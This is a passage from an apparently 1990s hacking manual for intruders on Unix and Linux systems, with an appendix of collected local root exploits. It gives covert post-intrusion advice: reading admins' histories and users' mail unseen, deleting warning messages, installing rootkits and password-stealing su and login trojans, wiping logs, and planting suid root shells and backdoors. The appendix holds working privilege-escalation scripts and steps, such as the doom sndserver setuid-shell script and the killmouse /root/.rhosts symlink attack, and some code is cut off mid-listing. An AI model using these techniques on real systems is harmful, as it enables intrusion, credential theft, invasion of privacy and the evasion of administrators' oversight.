blank.  (or set a passwd don't matter) On this account we are even gid=0 <G>rin

Installing games
----------------

You could always install exploitable doom or abuse into the system if they
already have games installed.  I will include the root exploits for these
games below in the appendix.

Always be watching
------------------

Always know who the admin's are on a system, you can find them by looking at
the passwd file to see home directories, placement of the uid, group access
accounts, and ALWAYS read all of the bash_history files in the user directories
to see who is using admin commands.  You will also learn allot of new commands
from reading history files, but you want to know who is who on the system.
Get to know your system well. Look for users using su:  View the log files
to see who is using admin commands.

Always be watching the system, keep track of who is on while you are.  Watch
the admin's history to see what commands they are using, ttysnoops? too many
ps commands?  finger commands after ps or w or who commands will show they
are watching what other users on the system are doing.  Watch your admin's
and get to know how aware they are of users on their system.

Reading system mail

Rember first NEVER to use system mail programs!  They will be able to tell you
are reading their mail.  I use a combo of a few things.  Here you go...

1. cd /var/spool/mail

This will put you into the directory that holds all of the unread mail, or
waiting mail.  Now you can do things like:

grep -i security * |more
grep -i hack * |more
grep -i intruder * |more
grep -i passwd * |more
grep -i password * |more

Then if needed pico username, and ctrl w to search for your maeesge.  You
can also delete messages if you see some other admin is telling them that
your user name is hacking their machine from their domain.

For a mail reader that will allow toy to read mail without updating pointers
try:

http://obsidian.cse.fau.edu/~fc
has a util on it that can cat /var/spool/mail files without changing the
last read dates.. ie they have no idea that you have read their mail.

Also remember you can find other system mail in user's directories.  Make sure
to look in the /root directory.  Look for /root/mail or username/mail or other
directories or filders that contain older mail.

Happy Hunting ...

Section 7B
Root and Demon kits and trojans
--------------------------------

Root kits are C source for ps, login, netstat and sometimes some other
programs that have been hacked for you.  With these kits you will be
able to replace the login files on the hacked box so that you can login
without an account on the machine.

You will also be able to patch ps so that you will not show up when an
admin uses the ps command.  With the ps patch you can also have it not show
processes that have certain file names such as any file that starts with
'sniff'.

Demon kits will have hacked programs for identd, login demon, ping, su,
telnetd, and, socket.

Trojans will be any file that you can use that will allow you to exploit
the system in some way.  An su trojan placed in the admin's directory would
run the trojan su first after you change the export path for him ;) and report
back that he typed the wrong passwd and delete the trojan file, but saving
the password he typed to the /tmp directory.

A login trojan would save all login passwords to a file on the machine
for you.  I think you get the idea ;)

Demon and Linux root kits have been uuencoded and attached to the end of
appendix VI

******************************************
* Appendix I - Things to do after access *
******************************************


I think in this paper we have covered most of the things  you can do after
access, so I will make this in the style of a checklist from a to z.

a. learn who the admin's are on the system
b. watch the system with ps -auxe and ps -auxef (if it works) and pstree to
   try and keep track of what others are doing
c. read all of the bash history files or any history files you can find on the
   machine to learn more yourself, and to learn about the users
d. make as many backdoor's into the system as you can that you are sure will
   not be found out
e. keep the access to yourself, don't give out users passwords on the machine
   you get root on.
f. always clean your utmp and wtmp right away when you login
g. always clean your mess as you go along, this includes your xferlog and
   messages
h. if you have root access make sure to read /etc/syslog.conf and
   /etc/login.defs to see how the system is logging
i. before changing binary files look at the root cron to see what they are
   running.
j. look for md5 on the system
k. look for separate ftp logs
l. make sure to clean the www logs if you ever send phf commands to the server
m. make an suid root shell and place it somewhere on the system
n. do only what you are sure of, don't do everything in this hacking manual all
   at once or you are asking to get cought
o. only use nested directories, do not put files into user directories where
   all they need to do is type ls to see them
p. don't add user accounts and think they will not notice you.
q. don't use pine or other mail programs to read users mail. if you want to
   read mail go to the mail dir and read it from unix, new mail you will find
   in /var/spool/mail read it there.
r. don't change the system so that other programs they have running will not
   work any more, they will be on you like fly's on shit
s. don't delete files on the system unless you put them there
t. do not modify their web pages, like i was here ... you are not a hacker you
   are a little kid wanting attention
u. do not change any passwords on the system (unless you are doing it for
   access and have backed up the passwd file and replace it right after you
   login
v. do not use any root account machines for irc access, or to load a bot on
w. if your root account changes or you create files that are owned by the
   wrong group, be sure to chown the files
x. do not use .rhosts if there is already one there that is being used
y. never telnet or ftp to your account from the hacked box
z. don't fuck up their machine! only do what you know how to do.

in /sbin you will find a symbolic link called dip to a suid root binary.
Chances are, if this file is suid, it's sploitable.

this one is a little old but I'm rather proud of it so I thought I'd give
it a praise.  in writing the linux kernel the guys who wrote a certain
section fucked up.  they let you stretch and modify the area of memory
you can access.  at first the sploit required a System.map to be in the
root dir.  so the simple solution to the bug was to delete all System.map
files off the system and remove all the uncompressed kernels (cause you
can generate a System.map by doing an nm on uncompressed kernels), this
is now rather stupid cause there are patches for all kernel versions with
the bug and I have written a version of this sploit that doesn't need a
System.map.

   before 1.3.20 ..

In the /usr/bin dir (usually) you will find a suid root binary called
suidperl.  If this file is suid root it is most probably sploitable.

You need to set this file suid
(chmod 4700 will do it) and execute it to get root.

/* smh.c - atreus - Michael R. Widner (2/27/95)
 * <widner@uchicago.edu> <atreus@primus.com>
 * a quick hack to abuse sendmail 8.6.9 or whatever else is subject to this
 * hole.  It's really just a matter of passing newlines in arguments to
 * sendmail and getting the stuff into the queue files.  If we run this
 * locally with -odq we are guaranteed that it will be queue, rather than
 * processed immediately.
 * usage: smh [ username [/path/to/sendmail]]
 * It's worth noting that this is generally only good for getting bin.
 * sendmail still wants to process the sendmail.cf file, which contains
 * Ou1 and Og1 most of the time, limiting you to bin access.  Is there
 * a way around this?
 * cc -o smh smh.c should do the trick.  This just creates a bin owned
 * mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.  Note that on some
 * systems this is pretty much worthless, but you're smart enough to know
 * which systems those are.  Aren't you?

There is a security hole in RedHat 2.1, which installs the game abuse,
/usr/lib/games/abuse/abuse.console suid root.  The abuse.console program
loads its files without absolute path names, assuming the user is running
abuse from the /usr/lib/games/abuse directory.  One of these files in the
undrv program, which abuse executes as root.  If the user is not in the
abuse directory when running this, an arbitrary program can be substituted
for undrv, allowing the user to execute arbitrary commands as root. 
   If abuse.console needs to be run by users other than root at the console,
provisions need to be made in the code to not execute or load any files
as root.

Yes,  very true. And just in case anybody collects these scripts, here's
the obvious one:

------------ CUT HERE --------------
#!/bin/sh
# Tue Dec 17 10:02:20 MET 1996 Bo
echo 'sndserver "/tmp/sndserver"' > .doomrc
cat > /tmp/sndserver.c << EOF
#include <stdio.h>
#include <unistd.h>
main() {
        if (fork()) while (getc(stdin));
        else system("cp /bin/sh /tmp; chmod +s /tmp/sh");
                /* or whatever you like to do */
}
EOF
gcc /tmp/sndserver.c -o /tmp/sndserver

------------ CUT HERE --------------

The  fork()  is  just so that doom runs on nicely without locking up the
keyboard  and  sndserver  gobbles  up all the sound data send to it. Run
the script, start sdoom, quit the normal way, and execute /tmp/sh.

Thanks for pointing it out, Joe.

In Debian 1.1, the optional DOSEMU package installs /usr/sbin/dos
setuid root.  This is a serious security hole which can be exploited
to gain access to any file on the system.

Package: dosemu
Version: 0.64.0.2-9

I expect there may be other holes in dosemu other than this one that
can be exploited if it is installed setuid root.  It took about 60
seconds to find this hole once I realized /usr/bin/dos was setuid
root.

Note: This security hole can be corrected by removing the suid bit from

System:
Probably  Linux  specific.  Slackware  3.0 (installs Linux 1.2.13) which
have  gpm  utility  and/or  the  Doom  package installed are vulnerable.
Other distributions might be too.

Impact:
Local users can acquire root status.

Background:
The  problem  is  the  killmouse/startmouse command that is part of Doom
package  on  Linux  systems.  It  is  actually a C-wrapper that runs two
scripts  (killmouse.sh/startmouse.sh). It runs suid root.

Problem:
I would try to describe the problem but I can't stop laughing.

Exploit:
This  can  be  exploited  in  a few similar ways. Here's just one. Let's
assume  the  gpm  utility is not running. We can't start it up ourselves
as gpm is only to be run by root. So we'll use startmouse to fire it up:

$ touch /tmp/gpmkilled
$ /usr/games/doom/startmouse

ps -aux | grep gpm
bo        1436  0.0  2.0   40  312 v03 R    16:33   0:00 grep gpm
root      1407  0.0  2.4   42  368  ?  S    16:24   0:00 /usr/bin/gpm t ms

Fine,  it's  running.  Now  we'll use killmouse to kill the process, but
first we set our umask to 0 and link /tmp/gpmkilled to /root/.rhosts:

$ umask 0
$ ln -s /root/.rhosts /tmp/gpmkilled
$ /usr/games/doom/killmouse
 1407  ?  S     0:00 gpm t ms

$ ls -l /root/.rhosts
-rw-rw-rw-   1 root     users           0 Dec 13 16:44 /root/.rhosts

$ echo localhost bo > /root/.rhosts
$ rsh -l root localhost sh -i
bash#

Bingo.  On  some  systems gpm might not be started in /etc/rc.d/rc.local
so  the  startmouse  script will fail. But gpm might be running already.
If  neither of these conditions are met, note that startmouse.sh creates
/tmp/gpmscript  and runs it in a shell. There's a window of time between
creating  the  script and executing it, so we have a nice race condition
here; it can be replaced with anything you like prior to execution.

Solution:
Remove  setuid  bits  of  killmouse/startmouse.  Better yet - nuke them.
While your at it, nuke Doom too - it's a stupid game anyway :-)

Best regards,
                Bo (bo@ebony.iaehv.nl)

There is a security hole in RedHat 2.1, which installs the program
/usr/bin/resizecons suid root.  The resizecons program allows a user
to change the videmode of the console.  During this process, it runs
the program restoretextmode without an absolute pathname, assuming the
correct version will be found in the path, while running with root
privileges.  It then executes setfont in the same manner.  By setting
the path to find a rogue restoretextmode, a user can execute an arbitrary
program as root.

As a more amusing aside, the file /tmp/selection.pid is read and the
pid contained within is sent a SIGWINCH, allowing a user on the system
to force a redraw of the screen to an arbitrary process (that handles 
SIGWINCH calls) on the machine. 

If /usr/bin/resizecons needs to be run by users other than root at the
console, provisions need to be made in the code to execute the outside
utilities with absolute pathnames, and to check access rights on files
before opening.

Linux 'restorefont' Security Holes
by FEH Staff

Linux's svgalib utilities, required to be suid root, have a problem in that
they do not revoke suid permissions before reading a file.  This is exploited
in the restorefont utility, but similar bugs exist in other svgalib utilities.
The restorefont utility serves two functions.  First, it will read a font from
a file and write it to the console as the font.  Second, it will read a font
from the console and write it out to a file.  Luckily, the specific bug
in restorefont can only be exploited if someone is at the console, reducing
its overall impact on the security of the system as a whole.

In writing the utilities, the authors are cognizant of the fact that when
writing out the font, suid permissions must first be given up; it is in fact
commented as such in the code.  However, when reading in a font, the program
is still running with full suid root permissions.  This allows us to read in
any file for the font that root could access (basically, anything).

The applicable code to read in the file is shown below:

#define FONT_SIZE 8192
unsigned char font[FONT_SIZE];

	if (argv[1][1] == 'r') {
		FILE *f;
		f = fopen(argv[2], "rb");
		if (f == NULL) {
			error:
			perror("restorefont");
			exit(1);
		}
		if(1!=fread(font, FONT_SIZE, 1, f))
			{
			if(errno)
				goto error;
			puts("restorefont: input file corrupted.");
			exit(1);
			}
		fclose(f);

We can see from this that the file to be read in has to be at least 8k,
as if it is not, the program will produce an error and exit.  If the file
is at least 8k, the first 8k are read into the buffer, and the program 
proceeds to set whatever the contents of the file are to the font:
	vga_disabledriverreport();
	vga_setchipset(VGA);		/* avoid SVGA detection */
	vga_init();
	vga_setmode(G640x350x16);
	vga_puttextfont(font);
	vga_setmode(TEXT);

At this point, the console will now look quite unreadable if you are
reading something other than a font from that file.  But, the data that
is put into the font is left untouched and is readable using the -w option
of restorefont.  We then read the font back from video memory to a new file,
and our job is complete, we have read the first 8k of a file we shouldn't
have had access to.  To prevent detection of having run this, we probably
shouldn't leave an unreadable font on the screen, so we save and then restore
the original font before reading from the file.
The complete exploit is shown below:

                   Program: restorefont, a svgalib utility
Affected Operating Systems: linux
              Requirements: logged in at console
       Security Compromise: user can read first 8k of any file of at least
                            8k in size on local filesystems
                  Synopsis: restorefont reads a font file while suid root,
                            writing it to video memory as the current vga
                            font; anyone at console can read the current
                            font to a file, allowing you to use video memory
                            as an 8k file buffer.

The following is gleaned from the BugTraq mailing list:
-------------------------------------------------------
Since Bugtraq is exceptionally quiet lately, I though I should make it
come alive again with this discussion of the bug that was reported in
the wu.ftpd that comes with some Slackware distributions of Linux.
The report was just before Bugtraq went down for a long time, but
I've found the bug still to be present on all the Linux machines that
I have access to. So maybe it needs to be brought a little more in
the open. Here we go:

ObBug: - Short description of the bug

It involves wu.ftpd being misconfigured at compile time and allowing
SITE EXEC access to /bin (for anonymous or otherwise chroot-ed users
this is ~ftp/bin). Now if in this /bin resides a program that gives
access to executables outside /bin, but in the users reach (such as
/bin/bash that gives access to the user's homedir), this opens up
a root vulnerability. This should have been set to /bin/ftp-exec and
which be set by the _PATH_EXECPATH variable in src/pathnames.h before
compiling. The wu-ftpd-2.4_linux.tgz that I found somewhere on the
net has this securely set as default value.

- How to check ?

$ ftp -n localhost
user: <userid>
password: <passwd>
ftp> quote site exec bash -c id

If vulnerable it gives here: uid=0, gid=0, euid=<yourid>, egid=<your-gids>

Of course, bash should not be available at all

- How to exploit (in case your sysadmin or you think the above is not
  a problem)

go to your homedir and make a program: duh.c (or whatever)

main() {
   seteuid(0);

- How to fix?

Get the source of wu-ftpd-2.4.linux.tar.gz (stock wu-ftpd-2.4 from wuarchive
doesn't compile on linux) and compile it; you might want to define the
_PATH_PIDNAMES and _PATH_XFERLOG to other values there...(/usr/adm/ftp.pids-%s
and /usr/adm/xferlog for example). If you cannot find that I can email the
source to you,...if you trust the source I took somewhere unmodified and
if you trust me ;-) An arch search for wu-ftpd-2.4 will give you sites too.
I can remember that I got it that way.

can even be in a comment somewhere in the source instead of visual to

mme login_name
mme login_name new_tty

then a ttyname.

[crongrab] [public release]

Crontab has a bug.  You run crontab -e, then you goto a shell, relink the
temp fire that crontab is having you edit, and presto, it is now your
property.  This bug has been confirmed on various versions of OSF/1, Digital
UNIX 3.x, and AIX 3.x

If, while running my script, you somehow manage to mangle up your whole
system, or perhaps do something stupid that will place you in jail, then
neither I, nor sirsyko, nor the other fine folks of r00t are responsible.

Personally, I hope my script eats your cat and causes swarms of locuses to
decend down upon you, but I am not responsible if they do.

There are bugs in the IRIX mail proggies.  This sample script exploits them
to give you an suid shell of any user on the system, EXCEPT, for uid=0.

Obviously, this script should not be run if you are a clueless script kiddie
and have no clue what is going to do.  If this script causes any sort of
harm to you, physically or virtually, them members of r00t are not responsible,
and in fact will probably laugh at you.
